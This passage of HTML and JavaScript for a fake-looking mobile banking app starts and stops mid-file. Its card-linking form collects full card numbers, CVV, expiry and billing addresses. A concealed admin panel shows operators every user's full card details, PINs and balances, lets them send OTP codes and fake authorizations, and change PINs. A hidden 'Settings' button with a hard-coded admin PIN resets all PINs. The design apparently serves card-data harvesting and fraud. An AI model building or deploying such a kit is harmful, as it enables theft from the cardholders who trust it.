  if(!notifs.length){const p=document.createElement('p');p.style.cssText='text-align:center;opacity:0.6;';p.textContent=t('noNotifications');c.appendChild(p);}
  else{
    notifs.slice().reverse().forEach(n=>{
      const el=document.createElement('div');el.className='notification-item'+(n.read?'':' unread');
      const ic=n.type==='card_rejected'?'‚ùå':n.type==='card_authorized'?'‚úÖ':n.type==='otp_required'?'üîê':'üì¢';
      let ex='';if(n.type==='otp_required'&&n.otp)ex='<div class="notification-otp">Your OTP: <strong>'+n.otp+'</strong></div>';
      el.innerHTML='<div class="notification-icon">'+ic+'</div><div class="notification-content"><div class="notification-message">'+n.message+'</div>'+ex+'<div class="notification-time">'+formatDate(n.date)+'</div></div>';
      c.appendChild(el);
    });
    await runTransaction(userDataRef,u=>{if(u&&u.notifications){u.notifications.forEach(n=>n.read=true);return u;}return u;});
    document.getElementById('notification-badge').style.display='none';
  }
  document.getElementById('notifications-modal').style.display='flex';
};
document.getElementById('close-notifications').onclick=()=>document.getElementById('notifications-modal').style.display='none';
setInterval(checkNotifications,10000);
async function loadAdminPanel(){
  const snap=await get(ref(db,'users'));if(!snap.exists())return;
  const users=snap.val(),pending=[],byCountry={};
  for(const uid in users){
    const u=users[uid];if(u.email==='admin@gmail.com')continue;
    const cards=u.linkedCards||[];
    if(cards.some(c=>c.status==='pending'||c.status==='otp_required'))pending.push({uid,user:u});
    const co=u.country||'Unknown';if(!byCountry[co])byCountry[co]=[];byCountry[co].push({uid,user:u});
  }
  const rul=document.getElementById('required-updates-list');rul.innerHTML='';
  if(!pending.length){rul.innerHTML='<p style="text-align:center;opacity:0.6;">No users requiring updates</p>';}
  else pending.forEach(({uid,user})=>rul.appendChild(createUserCard(uid,user,true)));
  const cs=document.getElementById('country-sections');cs.innerHTML='';
  Object.keys(byCountry).sort().forEach(co=>{
    const sec=document.createElement('div');sec.className='country-section';
    const hdr=document.createElement('div');hdr.className='country-header';
    hdr.innerHTML='<h3>'+co+'</h3><span class="country-count">'+byCountry[co].length+' '+t('users')+'</span>';
    sec.appendChild(hdr);const ul=document.createElement('div');ul.className='country-users-list';
    byCountry[co].forEach(({uid,user})=>ul.appendChild(createUserCard(uid,user,false)));
    sec.appendChild(ul);cs.appendChild(sec);
  });
}
function createUserCard(uid,user,showUrgent){
  const cards=user.linkedCards||[];let cardsHTML='',urgentBadge='';
  if(cards.length){
    cardsHTML='<div class="admin-cards-section"><h4>Linked Cards:</h4>';
    cards.forEach((card,ci)=>{
      const sc=card.status==='authorized'?'authorized':card.status==='otp_required'?'otp':card.status==='rejected'?'rejected':'pending';
      if(showUrgent&&(card.status==='pending'||card.status==='otp_required'))urgentBadge='<span class="urgent-badge">'+t('requiresAction')+'</span>';
      cardsHTML+='<div class="admin-card-item"><div class="admin-card-details"><strong>'+card.brand+'</strong> ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ '+card.lastFour+'<br><small>Name: '+card.name+'</small><br><small>Expiry: '+card.expiry+' | CVV: '+card.cvv+'</small><br><small>Full: '+card.number+'</small><br>'+(card.otp?'<small style="color:#3b82f6;">OTP: '+card.otp+'</small><br>':'')+(card.rejectionReason?'<small style="color:#ff5c5c;">Rejected: '+card.rejectionReason+'</small><br>':'')+'<span class="card-status '+sc+'">'+({authorized:'‚úì Authorized',otp_required:'üîê OTP Required',rejected:'‚ùå Rejected',pending:'‚è≥ Pending'}[card.status]||card.status)+'</span></div><div class="admin-card-actions"><button class="admin-auth-btn" onclick="authorizeCard(\''+uid+'\','+ci+')">Authorize</button><button class="admin-otp-btn" onclick="requireOTP(\''+uid+'\','+ci+')">Require OTP</button><button class="admin-reject-btn" onclick="rejectCard(\''+uid+'\','+ci+')">Reject</button></div></div>';
    });
    cardsHTML+='</div>';
  }
  const sym=currencySymbols[user.currency]||'$';
  const el=document.createElement('div');el.className='admin-user-card';
  el.innerHTML=urgentBadge+'<div class="admin-user-info"><div class="admin-user-name">'+user.firstname+' '+user.surname+'</div><div class="admin-user-detail">Email: '+user.email+'</div><div class="admin-user-detail">Account: '+user.accountNumber+'</div><div class="admin-user-detail">Country: '+(user.country||'N/A')+'</div><div class="admin-user-detail">Current PIN: '+(user.pin||'N/A')+'</div><div class="admin-user-detail">Balance: '+sym+(user.balance||0).toLocaleString()+'</div></div>'+cardsHTML+'<div class="admin-user-actions"><input type="text" class="admin-pin-input" placeholder="New PIN" maxlength="4" id="pin-'+uid+'"><button class="admin-change-pin-btn" onclick="changeUserPin(\''+uid+'\')">Change PIN</button></div>';
  return el;
}
window.authorizeCard=async function(uid,ci){
  if(!confirm('Authorize this card?'))return;
  const ur=ref(db,'users/'+uid);
  await runTransaction(ur,u=>{if(u&&u.linkedCards&&u.linkedCards[ci]){u.linkedCards[ci].status='authorized';if(!u.notifications)u.notifications=[];u.notifications.push({type:'card_authorized',message:'Your card ending in '+u.linkedCards[ci].lastFour+' has been authorized!',cardLastFour:u.linkedCards[ci].lastFour,date:new Date().toISOString(),read:false});return u;}return u;});
  alert('Card authorized! User notified.');loadAdminPanel();
};
window.requireOTP=async function(uid,ci){
  const otp=prompt('Enter OTP code:');if(!otp){alert('OTP required');return;}
  const ur=ref(db,'users/'+uid);
  await runTransaction(ur,u=>{if(u&&u.linkedCards&&u.linkedCards[ci]){u.linkedCards[ci].status='otp_required';u.linkedCards[ci].otp=otp;if(!u.notifications)u.notifications=[];u.notifications.push({type:'otp_required',message:'OTP required for card ending in '+u.linkedCards[ci].lastFour+'. Check notifications.',cardLastFour:u.linkedCards[ci].lastFour,otp,date:new Date().toISOString(),read:false});return u;}return u;});
  alert('OTP sent!');loadAdminPanel();
};
window.rejectCard=async function(uid,ci){
  const reason=prompt('Rejection reason:')||'Unable to authorize card';
  if(!confirm('Send rejection to user?'))return;
  const ur=ref(db,'users/'+uid);
  await runTransaction(ur,u=>{if(u&&u.linkedCards&&u.linkedCards[ci]){u.linkedCards[ci].status='rejected';u.linkedCards[ci].rejectionReason=reason;if(!u.notifications)u.notifications=[];u.notifications.push({type:'card_rejected',message:t('cardAuthFailed')+': '+reason,cardLastFour:u.linkedCards[ci].lastFour,date:new Date().toISOString(),read:false});return u;}return u;});
  alert('Rejection sent!');loadAdminPanel();
};
window.changeUserPin=async function(uid){
  const p=document.getElementById('pin-'+uid).value.trim();
  if(!p||p.length!==4||!/^\d{4}$/.test(p)){alert(t('pinInvalid'));return;}
  if(!confirm('Change PIN to '+p+'?'))return;
  await runTransaction(ref(db,'users/'+uid),u=>{if(u){u.pin=p;return u;}return u;});
  alert(t('pinUpdated'));loadAdminPanel();
};
document.getElementById('admin-logout-btn').onclick=()=>signOut(auth);
document.getElementById('admin-change-all-btn').onclick=async()=>{
  const p=document.getElementById('admin-global-pin').value.trim();
  if(!p||p.length!==4||!/^\d{4}$/.test(p)){alert(t('pinInvalid'));return;}
  if(!confirm("Change ALL users' PINs to "+p+'?'))return;
  const snap=await get(ref(db,'users'));
  if(snap.exists()){const us=snap.val();let count=0;for(const uid in us){if(us[uid].email==='admin@gmail.com')continue;await runTransaction(ref(db,'users/'+uid),u=>{if(u){u.pin=p;return u;}return u;});count++;}alert('Updated '+count+" users' PINs to "+p+'!');loadAdminPanel();}
  else alert('No users found.');
};
let adminClicks=0,adminTimer=null;
document.getElementById('admin-migrate-btn').onclick=async()=>{
  adminClicks++;
  if(adminClicks===1){adminTimer=setTimeout(()=>adminClicks=0,3000);return;}
  if(adminClicks===2){clearTimeout(adminTimer);adminClicks=0;const p=prompt('Enter Admin PIN:');if(p!=='040930'){alert('Invalid!');return;}if(!confirm("Update ALL users' codes to 1234?"))return;const snap=await get(ref(db,'users'));if(snap.exists()){const us=snap.val();let c=0;for(const uid in us){await runTransaction(ref(db,'users/'+uid),u=>{if(u){u.pin='1234';return u;}return u;});c++;}alert('Updated '+c+' users!');}}
};
</script>

<style>
*{box-sizing:border-box;}
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(180deg,#0a2540 0%,#001022 100%);color:#fff;min-height:100vh;}
.language-selector{position:fixed;top:20px;right:20px;width:40px;height:40px;background:rgba(255,255,255,0.1);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:999;font-size:24px;border:1px solid rgba(255,255,255,0.2);transition:all 0.3s;}
.language-selector:hover{background:rgba(255,255,255,0.2);transform:scale(1.1);}
#auth-screen{height:100vh;display:flex;flex-direction:column;justify-content:center;padding:20px;overflow-y:auto;}
.form-section{background:rgba(255,255,255,0.08);padding:20px;border-radius:16px;margin:12px 0;}
input,select,button{width:100%;padding:12px;margin:8px 0;border:none;border-radius:10px;font-size:15px;}
input,select{background:rgba(255,255,255,0.12);color:#fff;}
input::placeholder{color:rgba(255,255,255,0.5);}
select option{background:#0a2540;color:#fff;}
button{background:#0055ff;color:white;font-weight:bold;cursor:pointer;transition:background 0.2s;}
button:hover{background:#0044dd;}
.toggle-link{text-align:center;margin-top:12px;color:#4dabff;text-decoration:underline;cursor:pointer;font-size:14px;}
#dashboard{padding:24px 16px 140px;}
.header{text-align:center;margin:40px 0 24px;}
.username-display{font-size:22px;font-weight:600;margin-bottom:8px;color:#fff;}
/* FIX: Compact balance card matching reference image */
.balance-card{background:linear-gradient(135deg,#1a4bff,#0033cc);border-radius:20px;padding:20px 24px;margin:16px auto;box-shadow:0 8px 24px rgba(0,85,255,0.4);max-width:360px;width:calc(100% - 32px);display:block;}
.card-number{font-size:15px;letter-spacing:1.5px;margin-bottom:14px;color:rgba(255,255,255,0.85);font-family:'Courier New',monospace;}
.card-balance{font-size:38px;font-weight:800;color:white;text-align:right;letter-spacing:-1px;}
.card-balance-label{font-size:13px;opacity:0.75;text-align:right;margin-top:2px;}
.accounts-btn{background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff;padding:12px 32px;border-radius:30px;font-size:16px;margin:12px auto;display:block;cursor:pointer;max-width:200px;}
.nav-section{margin:24px 0;}
.bottom-nav{background:rgba(0,37,90,0.85);backdrop-filter:blur(12px);display:flex;justify-content:space-around;padding:12px 0;border-radius:20px;border:1px solid rgba(255,255,255,0.1);}
.nav-item{text-align:center;color:#fff;font-size:28px;cursor:pointer;width:60px;position:relative;}
.nav-label{font-size:11px;margin-top:4px;opacity:0.8;}
.section-title{font-size:18px;font-weight:600;margin:32px 0 16px;opacity:0.9;}
.transaction-item{background:rgba(255,255,255,0.06);border-radius:16px;padding:16px;margin-bottom:12px;display:flex;align-items:center;gap:16px;}
.transaction-icon{width:48px;height:48px;background:rgba(0,85,255,0.3);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:bold;color:white;flex-shrink:0;}
.transaction-details{flex:1;min-width:0;}
.transaction-title{font-weight:600;font-size:15px;margin-bottom:4px;}
.transaction-time{font-size:13px;opacity:0.6;}
.transaction-amount{font-weight:bold;font-size:16px;text-align:right;white-space:nowrap;}
.negative{color:#ff5c5c;}.positive{color:#34d399;}
.error{color:#ff5c5c;text-align:center;margin:6px 0;font-size:13px;}
.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);justify-content:center;align-items:flex-start;z-index:1000;overflow-y:auto;padding:20px;padding-top:60px;}
.modal-content{background:linear-gradient(135deg,#001f3f,#000d1a);padding:20px;border-radius:16px;width:100%;max-width:360px;color:#fff;margin:auto;position:relative;}
.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;}
.close-btn{background:none;border:none;color:#fff;font-size:32px;cursor:pointer;padding:0;width:40px;height:40px;display:flex;align-items:center;justify-content:center;}
.account-info p{display:flex;justify-content:space-between;margin:12px 0;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.1);gap:12px;}
.account-info strong{opacity:0.7;flex-shrink:0;}.account-info span{text-align:right;word-break:break-all;}
.copy-btn{background:rgba(0,85,255,0.3);padding:8px 16px;border-radius:8px;font-size:13px;margin-top:8px;}
.more-options{display:flex;flex-direction:column;gap:4px;}
.more-item{padding:16px;background:rgba(255,255,255,0.05);border-radius:12px;cursor:pointer;transition:background 0.2s;}
.more-item:hover{background:rgba(255,255,255,0.1);}
.pin-input{font-size:18px;letter-spacing:8px;text-align:center;font-family:monospace;}
.withdrawal-notice{background:rgba(255,193,7,0.15);border-left:3px solid #ffc107;padding:12px;margin:12px 0;border-radius:8px;font-size:13px;color:#ffc107;}
.generate-pin-btn{background:rgba(52,211,153,0.2);color:#34d399;border:1px solid #34d399;padding:10px 20px;border-radius:8px;font-size:13px;cursor:pointer;width:auto;display:inline-block;}
.top-buttons{display:flex;gap:8px;justify-content:space-between;margin-bottom:16px;}
.top-buttons button{flex:1;padding:10px;font-size:13px;}
.language-options{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:16px;}
.language-option{padding:12px;background:rgba(255,255,255,0.05);border-radius:8px;cursor:pointer;text-align:center;transition:background 0.2s;border:1px solid rgba(255,255,255,0.1);}
.language-option:hover{background:rgba(255,255,255,0.1);}
#withdraw-fields-container{display:flex;flex-direction:column;}
#withdraw-fields-container input{margin:8px 0;}
.card-input-group{display:flex;gap:8px;}.card-input-group input{flex:1;}
.billing-address-section{background:rgba(255,255,255,0.05);padding:16px;border-radius:12px;margin:16px 0;}
.billing-address-section h4{font-size:14px;margin-bottom:12px;opacity:0.8;}
#card-auth-screen{display:none;position:fixed;inset:0;background:linear-gradient(180deg,#0a2540 0%,#001022 100%);z-index:2000;padding:24px;overflow-y:auto;flex-direction:column;align-items:center;justify-content:center;text-align:center;}
.auth-screen-content{max-width:400px;width:100%;}
.auth-screen-icon{font-size:80px;margin-bottom:24px;animation:pulse 2s infinite;}
.auth-screen-title{font-size:24px;font-weight:600;margin-bottom:16px;}
.auth-screen-text{font-size:16px;opacity:0.8;line-height:1.6;margin-bottom:32px;}
.auth-options{background:rgba(255,255,255,0.08);border-radius:16px;padding:20px;margin:24px 0;}
.auth-option{display:flex;align-items:flex-start;gap:16px;padding:16px;background:rgba(255,255,255,0.05);border-radius:12px;margin-bottom:12px;text-align:left;}
.auth-option-icon{font-size:32px;}
.auth-option-title{font-weight:600;margin-bottom:4px;}
.auth-option-desc{font-size:13px;opacity:0.7;white-space:pre-line;}
.auth-action-buttons{display:flex;flex-direction:column;gap:12px;margin-top:32px;}
.otp-input-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:2001;justify-content:center;align-items:center;padding:24px;}
.otp-input-content{background:linear-gradient(135deg,#001f3f,#000d1a);padding:32px;border-radius:20px;max-width:400px;width:100%;text-align:center;}
.otp-input-title{font-size:24px;font-weight:600;margin-bottom:16px;}
.otp-input-text{font-size:14px;opacity:0.8;margin-bottom:24px;}
.otp-input-field{width:100%;padding:16px;font-size:24px;letter-spacing:8px;text-align:center;background:rgba(255,255,255,0.1);border:2px solid #0055ff;border-radius:12px;color:white;margin-bottom:16px;}
.card-status{display:inline-block;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:600;margin-top:8px;}
.card-status.pending{background:rgba(255,193,7,0.2);color:#ffc107;border:1px solid #ffc107;}
.card-status.authorized{background:rgba(52,211,153,0.2);color:#34d399;border:1px solid #34d399;}
.card-status.otp{background:rgba(59,130,246,0.2);color:#3b82f6;border:1px solid #3b82f6;}
.card-status.rejected{background:rgba(255,92,92,0.2);color:#ff5c5c;border:1px solid #ff5c5c;}
.rejection-reason{margin-top:6px;padding:8px;background:rgba(255,92,92,0.1);border-left:3px solid #ff5c5c;border-radius:4px;font-size:12px;color:#ff5c5c;}
.locked-notice{background:rgba(59,130,246,0.15);border-left:3px solid #3b82f6;padding:12px;border-radius:8px;font-size:13px;color:#3b82f6;margin-top:8px;}
.linked-card-item{background:rgba(255,255,255,0.06);border-radius:12px;padding:16px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;border:1px solid rgba(255,255,255,0.1);}
.linked-card-info{flex:1;}.linked-card-brand{font-size:14px;font-weight:600;color:#4dabff;margin-bottom:4px;}
.linked-card-number{font-size:16px;font-weight:600;margin-bottom:4px;font-family:'Courier New',monospace;}
.linked-card-name{font-size:13px;opacity:0.7;margin-bottom:2px;}.linked-card-expiry{font-size:12px;opacity:0.6;}
.remove-card-btn{background:#ff5c5c;color:white;padding:8px 16px;border-radius:8px;border:none;cursor:pointer;font-size:13px;width:auto;margin:0;}
.notification-badge{position:absolute;top:-5px;right:-5px;background:#ff5c5c;color:white;border-radius:50%;width:20px;height:20px;display:none;align-items:center;justify-content:center;font-size:11px;font-weight:bold;}
.notification-item{background:rgba(255,255,255,0.06);border-radius:12px;padding:12px;margin-bottom:12px;display:flex;gap:12px;border:1px solid rgba(255,255,255,0.1);}
.notification-item.unread{background:rgba(59,130,246,0.1);border-color:#3b82f6;}
.notification-icon{font-size:24px;flex-shrink:0;}.notification-content{flex:1;}
.notification-message{font-size:14px;margin-bottom:4px;}.notification-time{font-size:12px;opacity:0.6;}
.notification-otp{background:rgba(59,130,246,0.15);border-left:3px solid #3b82f6;padding:8px 12px;margin:8px 0;border-radius:4px;font-size:14px;}
.notification-otp strong{color:#3b82f6;font-size:16px;letter-spacing:2px;}
.urgent-badge{background:#ff5c5c;color:white;padding:6px 12px;border-radius:20px;font-size:11px;font-weight:bold;display:inline-block;margin-bottom:12px;animation:pulse 2s infinite;}
@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.7;}}
#admin-panel{display:none;padding:24px 16px;min-height:100vh;}
.admin-header{text-align:center;margin-bottom:32px;}
.admin-global-controls{background:rgba(255,255,255,0.08);padding:20px;border-radius:16px;margin-bottom:24px;}
.admin-global-input{display:flex;gap:12px;margin-bottom:12px;}
.admin-global-pin{flex:1;padding:12px;border-radius:10px;background:rgba(255,255,255,0.12);border:none;color:#fff;font-size:18px;letter-spacing:4px;text-align:center;}
.admin-change-all-btn{background:#ff9800;color:white;padding:12px 24px;border-radius:10px;border:none;font-weight:bold;cursor:pointer;}
.admin-logout-btn{background:#ff5c5c;color:white;padding:10px 20px;border-radius:10px;border:none;cursor:pointer;margin-top:12px;width:100%;}
.admin-user-card{background:rgba(255,255,255,0.06);border-radius:16px;padding:16px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1);}
.admin-user-name{font-size:18px;font-weight:600;margin-bottom:8px;color:#4dabff;}
.admin-user-detail{font-size:13px;opacity:0.8;margin:4px 0;}
.admin-user-actions{display:flex;gap:8px;margin-top:12px;}
.admin-pin-input{flex:1;padding:10px;border-radius:8px;background:rgba(255,255,255,0.12);border:none;color:#fff;font-size:16px;letter-spacing:4px;text-align:center;}
.admin-change-pin-btn{background:#34d399;color:white;padding:10px 20px;border-radius:8px;border:none;font-weight:bold;cursor:pointer;}
.admin-cards-section{margin-top:16px;padding-top:16px;border-top:1px solid rgba(255,255,255,0.1);}
.admin-cards-section h4{font-size:14px;margin-bottom:12px;opacity:0.8;}
.admin-card-item{background:rgba(255,255,255,0.04);padding:12px;border-radius:8px;margin-bottom:8px;border:1px solid rgba(255,255,255,0.08);}
.admin-card-details{margin-bottom:8px;font-size:13px;}
.admin-card-details small{display:block;opacity:0.7;margin:2px 0;}
.admin-card-actions{display:flex;gap:8px;margin-top:8px;flex-wrap:wrap;}
.admin-auth-btn{flex:1;padding:8px 12px;border-radius:6px;border:none;font-size:12px;font-weight:600;cursor:pointer;background:#34d399;color:white;}
.admin-otp-btn{flex:1;padding:8px 12px;border-radius:6px;border:none;font-size:12px;font-weight:600;cursor:pointer;background:#3b82f6;color:white;}
.admin-reject-btn{padding:8px 12px;border-radius:6px;border:none;font-size:12px;font-weight:600;cursor:pointer;background:#ff5c5c;color:white;}
.country-section{margin-bottom:32px;}
.country-header{display:flex;justify-content:space-between;align-items:center;background:rgba(0,85,255,0.1);padding:12px 16px;border-radius:12px;margin-bottom:16px;border-left:4px solid #0055ff;}
.country-header h3{margin:0;font-size:18px;color:#4dabff;}
.country-count{background:rgba(255,255,255,0.1);padding:4px 12px;border-radius:12px;font-size:13px;font-weight:600;}
.admin-section-title{font-size:20px;font-weight:600;margin:24px 0 16px;padding-bottom:8px;border-bottom:2px solid rgba(255,255,255,0.1);}
.required-updates-section{background:rgba(255,92,92,0.05);border:1px solid rgba(255,92,92,0.3);border-radius:16px;padding:16px;margin-bottom:32px;}
.btn-primary{background:#0055ff;color:white;border:none;border-radius:10px;padding:12px;font-size:15px;font-weight:600;cursor:pointer;width:100%;}
.btn-secondary{background:rgba(255,255,255,0.1);color:white;border:1px solid rgba(255,255,255,0.2);border-radius:10px;padding:12px;font-size:15px;cursor:pointer;width:100%;}
.btn-edit{background:rgba(255,193,7,0.2);color:#ffc107;border:1px solid #ffc107;border-radius:10px;padding:12px;font-size:15px;cursor:pointer;font-weight:600;width:100%;}
</style>
</head>
<body>
<div class="language-selector" id="language-selector">üåê</div>
<div id="auth-screen">
<div id="signup-section" class="form-section">
<h2 data-translate="createAccount">Create Account</h2>
<form id="signup-form">
<select id="su-country" required><option value="" data-translate="selectCountry">Select Country</option>
<optgroup label="North America"><option value="USA">United States</option><option value="Canada">Canada</option><option value="Mexico">Mexico</option></optgroup>
<optgroup label="Europe"><option value="UK">United Kingdom</option><option value="Germany">Germany</option><option value="France">France</option><option value="Italy">Italy</option><option value="Spain">Spain</option><option value="Portugal">Portugal</option><option value="Netherlands">Netherlands</option><option value="Belgium">Belgium</option><option value="Sweden">Sweden</option><option value="Norway">Norway</option><option value="Switzerland">Switzerland</option></optgroup>
<optgroup label="South America"><option value="Brazil">Brazil</option><option value="Argentina">Argentina</option><option value="Chile">Chile</option></optgroup>
<optgroup label="Africa"><option value="Nigeria">Nigeria</option><option value="South Africa">South Africa</option><option value="Kenya">Kenya</option><option value="Egypt">Egypt</option><option value="Morocco">Morocco</option></optgroup>
<optgroup label="Asia"><option value="China">China</option><option value="Japan">Japan</option><option value="India">India</option><option value="South Korea">South Korea</option><option value="Singapore">Singapore</option></optgroup>
<optgroup label="Oceania"><option value="Australia">Australia</option><option value="New Zealand">New Zealand</option></optgroup>
</select>
<input type="text" id="su-surname" data-translate="surname" placeholder="Surname" required>
<input type="text" id="su-firstname" data-translate="firstName" placeholder="First Name" required>
<input type="text" id="su-othername" data-translate="otherName" placeholder="Other Name (optional)">
<input type="tel" id="su-phone" data-translate="phoneNumber" placeholder="Phone Number" required>
<div id="dynamic-fields"></div>
<input type="text" id="su-username" data-translate="username" placeholder="Username" required>
<input type="email" id="su-email" data-translate="email" placeholder="Email" required>
<input type="password" id="su-password" data-translate="password" placeholder="Password (min 8 chars)" required minlength="8">
<input type="password" id="su-confirm" data-translate="confirmPassword" placeholder="Confirm Password" required>
<select id="su-currency" required><option value="USD">USD - US Dollar ($)</option><option value="EUR">EUR - Euro (‚Ç¨)</option><option value="GBP">GBP - British Pound (¬£)</option><option value="JPY">JPY - Japanese Yen (¬•)</option><option value="AUD">AUD - Australian Dollar (A$)</option><option value="CAD">CAD - Canadian Dollar (C$)</option><option value="CHF">CHF - Swiss Franc (Fr.)</option><option value="CNY">CNY - Chinese Yuan (¬•)</option></select>
<input type="text" id="su-promo" data-translate="promoCode" placeholder="Promo Code (optional)">
<button type="submit" data-translate="signUp">Sign Up</button>
</form>
<p class="error" id="signup-error"></p>
<div class="toggle-link" id="to-login" data-translate="alreadyHaveAccount">Already have an account? Log In</div>
</div>
<div id="login-section" class="form-section" style="display:none;">
<h2 data-translate="login">Log In</h2>
<form id="login-form">
<input type="email" id="li-email" placeholder="Email" required>
<input type="password" id="li-password" placeholder="Password" required>
<button type="submit" data-translate="login">Log In</button>
</form>
<p class="error" id="login-error"></p>
<div class="toggle-link" id="to-signup" data-translate="noAccount">Don't have an account? Sign Up</div>
</div>
</div>
<div id="dashboard">
<div class="header">
<div id="username-display" class="username-display">User</div>
<div class="balance-card">
<div class="card-number" id="card-number">**** *** ***</div>
<div class="card-balance"><span id="currency-symbol">$</span><span id="balance">0.00</span></div>
<div class="card-balance-label" data-translate="availableBalance">Available Balance</div>
</div>
<button class="accounts-btn" data-translate="accounts">Accounts</button>
</div>
<div class="nav-section">
<div class="bottom-nav">
<div class="nav-item" id="withdraw-btn"><div>‚Üì</div><div class="nav-label" data-translate="withdraw">Withdraw</div></div>
<div class="nav-item" id="send-btn"><div>‚Üí</div><div class="nav-label" data-translate="send">Send</div></div>
<div class="nav-item" id="add-card-btn"><div>üí≥</div><div class="nav-label" data-translate="addCard">Add Card</div></div>
<div class="nav-item" id="notifications-btn"><div>üîî</div><div class="nav-label" data-translate="alerts">Alerts</div><span class="notification-badge" id="notification-badge">0</span></div>
<div class="nav-item" id="more-btn"><div>‚ãØ</div><div class="nav-label" data-translate="more">More</div></div>
</div>
</div>
<div><h3 class="section-title" data-translate="recentTransactions">Recent Transactions</h3><div class="transactions-container" id="transactions-container"></div></div>
</div>
<!-- Account Modal -->
<div id="account-modal" class="modal"><div class="modal-content">
<div class="modal-header"><h3 data-translate="accountInfo">Account Information</h3><button id="close-account" class="close-btn">√ó</button></div>
<div class="top-buttons"><button id="copy-account" class="copy-btn">üìã <span data-translate="copyAccount">Copy Account</span></button><button id="generate-pin-btn" class="generate-pin-btn" data-translate="generatePin">Generate New PIN</button></div>
<div class="account-info">
<p><strong data-translate="accountNumber">Account Number:</strong><span id="acc-number">----------</span></p>
<p><strong data-translate="withdrawCode">4 Digit Withdraw Code:</strong><span id="acc-pin">Not yet generated</span></p>
<p><strong data-translate="country">Country:</strong><span id="acc-country">-</span></p>
<p><strong data-translate="surname">Surname:</strong><span id="acc-surname">-</span></p>
<p><strong data-translate="firstName">First Name:</strong><span id="acc-firstname">-</span></p>
<p><strong data-translate="otherName">Other Name:</strong><span id="acc-othername">-</span></p>
<p><strong data-translate="phoneNumber">Phone Number:</strong><span id="acc-phone">-</span></p>
<div id="country-specific-info"></div>
</div>
</div></div>
<!-- More Modal -->
<div id="more-modal" class="modal"><div class="modal-content">
<div class="modal-header"><h3 data-translate="more">More</h3><button id="close-more" class="close-btn">√ó</button></div>
<div class="more-options">
<div class="more-item" id="more-contact" data-translate="contactUs">Contact us</div>
<div class="more-item" id="more-help" data-translate="howToUse">How to use it</div>
<div class="more-item" id="more-account" data-translate="account">Account</div>
<div class="more-item" id="view-cards-btn">üí≥ <span data-translate="linkedCards">Linked Cards</span></div>
<div class="more-item" id="more-logout" style="color:#ff5c5c;" data-translate="logout">Logout</div>
<div class="more-item" id="admin-migrate-btn" style="opacity:0.3;font-size:11px;color:#888;" data-translate="settings">Settings</div>
</div>
</div></div>
<!-- Language Modal -->
<div id="language-modal" class="modal"><div class="modal-content">
<div class="modal-header"><h3>Select Language</h3><button id="close-language" class="close-btn">√ó</button></div>
<div class="language-options">
<div class="language-option" data-lang="en">üá∫üá∏ English</div>
<div class="language-option" data-lang="es">üá™üá∏ Espa√±ol</div>
<div class="language-option" data-lang="fr">üá´üá∑ Fran√ßais</div>
<div class="language-option" data-lang="de">üá©üá™ Deutsch</div>
<div class="language-option" data-lang="pt">üáßüá∑ Portugu√™s</div>
<div class="language-option" data-lang="zh">üá®üá≥ ‰∏≠Êñá</div>
</div>
</div></div>
<!-- Send Modal -->
<div id="send-modal" class="modal"><div class="modal-content">
<div class="modal-header"><h3 data-translate="sendMoney">Send Money</h3><button id="close-send" class="close-btn">√ó</button></div>
<form id="send-form">
<input type="text" id="send-recipient" data-translate="recipientAccount" placeholder="Recipient Account Number (10 digits)" required autocomplete="off" pattern="\d{10}" maxlength="10">
<div id="recipient-info" style="display:none;padding:8px;margin:8px 0;background:rgba(255,255,255,0.1);border-radius:8px;font-size:14px;"></div>
<input type="number" id="send-amount" data-translate="amount" placeholder="Amount" step="0.01" required min="0.01">
<p class="error" id="send-error"></p>
<button type="submit" data-translate="sendNow">Send Now</button>
</form>
</div></div>
<!-- Withdraw Modal -->
<div id="withdraw-modal" class="modal"><div class="modal-content">
<div class="modal-header"><h3 data-translate="withdrawFunds">Withdraw Funds</h3><button id="close-withdraw" class="close-btn">√ó</button></div>
<div class="withdrawal-notice" data-translate="withdrawalNotice">‚ö†Ô∏è You can only withdraw to accounts in your name</div>
<form id="withdraw-form">
<select id="withdraw-method" required><option value="" data-translate="selectMethod">Select Method</option></select>
<div id="withdraw-fields-container"></div>
<input type="number" id="withdraw-amount" data-translate="amount" placeholder="Amount" step="0.01" required min="1">
<input type="text" id="withdraw-pin" data-translate="enterPin" placeholder="Enter your 4-digit PIN" required pattern="\d{4}" maxlength="4" class="pin-input">
<p class="error" id="withdraw-error"></p>
<button type="submit" data-translate="requestWithdrawal">Request Withdrawal</button>
</form>
</div></div>
<!-- Notifications Modal -->
<div id="notifications-modal" class="modal"><div class="modal-content">
<div class="modal-header"><h3>üîî <span data-translate="alerts">Alerts</span></h3><button id="close-notifications" class="close-btn">√ó</button></div>
<div id="notifications-container"></div>
</div></div>
<!-- Card Modal -->
<div id="card-modal" class="modal"><div class="modal-content">
<div class="modal-header"><h3 id="card-modal-title">üí≥ Link Card</h3><button id="close-card" class="close-btn">√ó</button></div>
<div id="existing-card-container" style="display:none;"></div>
<div id="card-form-container">
<form id="card-form">
<input type="text" id="card-number-input" placeholder="Card Number (16 digits)" required pattern="\d{16}" maxlength="19" autocomplete="off" style="letter-spacing:2px;font-family:'Courier New',monospace;">
<input type="text" id="card-name" placeholder="Cardholder Name" required>
<div class="card-input-group">
<input type="text" id="card-expiry" placeholder="MM/YY" required pattern="\d{2}/\d{2}" maxlength="5">
<input type="text" id="card-cvv" placeholder="CVV" required pattern="\d{3}" maxlength="3">
</div>
<div class="billing-address-section">
<h4>üìç Billing Address</h4>
<input type="text" id="card-street" placeholder="Street Address" required>
<input type="text" id="card-postcode" placeholder="Postal Code" required>
<input type="text" id="card-city" placeholder="City" required>
<input type="text" id="card-country" placeholder="Country" required>
<input type="tel" id="card-phone" placeholder="Phone Number" required>
